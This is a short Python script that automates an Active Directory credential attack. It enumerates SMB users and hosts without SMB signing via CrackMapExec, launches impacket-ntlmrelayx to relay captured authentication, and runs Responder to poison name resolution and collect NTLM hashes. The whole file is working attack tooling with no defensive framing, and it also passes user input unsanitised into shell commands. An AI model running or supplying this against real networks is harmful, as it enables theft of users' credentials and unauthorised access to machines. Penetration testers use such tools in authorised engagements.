import subprocess

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", f"An error occurred: {e}"

def enumerate_users(target_ip, target_name):
    print(f"\nRunning CrackMapExec on {target_name} ({target_ip}) to enumerate users...\n")
    command = f"crackmapexec smb {target_ip} --users > usernames.txt"
    output, error = execute_command(command)
    if output:
        print("\nOutput usernames to username.txt in the current directory...\n")
    if error:
        print(f"Error: {error}")


def enumerate_shares(target_ip, target_name):
    print(f"\nRunning CrackMapExec on {target_name} ({target_ip}) to enumerate shares and check if smb signing is enabled...\n")
    command = f"crackmapexec smb {target_ip} --gen-relay-list smb_relay.txt "
    output, error = execute_command(command)
    if output:
        print("\nOutput hosts that don't require SMB signing to smb_relay.txt in the current directory...\n")
    if error:
        print(f"Error: {error}")

def start_ntlmrelay():
    print("\nStarting impacket-ntlmrelayx in a new terminal...\n")
    command = "xfce4-terminal --hold -e '`which impacket-ntlmrelayx` -tf smb_relay.txt -of netntlm -smb2support -socks'"
    output, error = execute_command(command)
    if output:
        print("\nRelaying hashes to try and authenticate ...\n")
    if error:
        print(f"Error: {error}")

def start_responder(interface):
    print("\nStarting Responder in a new terminal...\n")
    command = f"xfce4-terminal --hold -e 'sudo responder -I {interface}'"
    output, error = execute_command(command)
    if output:
        print("\nCapturing NTLM hashes from users...\n")
    if error:
        print(f"Error: {error}")



if __name__ == "__main__":
    target_ip = input("Enter the Target IP or Target IP Range: ")
    target_name = input("Enter the Target Name: ")
    enumerate_users(target_ip, target_name)

    enumerate_shares(target_ip, target_name)
    start_ntlmrelay()
    interface = input("Enter the network interface for Responder (e.g., eth0, wlan0): ")
    start_responder(interface)
    print("View netntlm in the current directory to see captured NTLM hashes. View usernames.txt for a list of users. View smb_relay.txt for host that do not have SMB signing enabled")

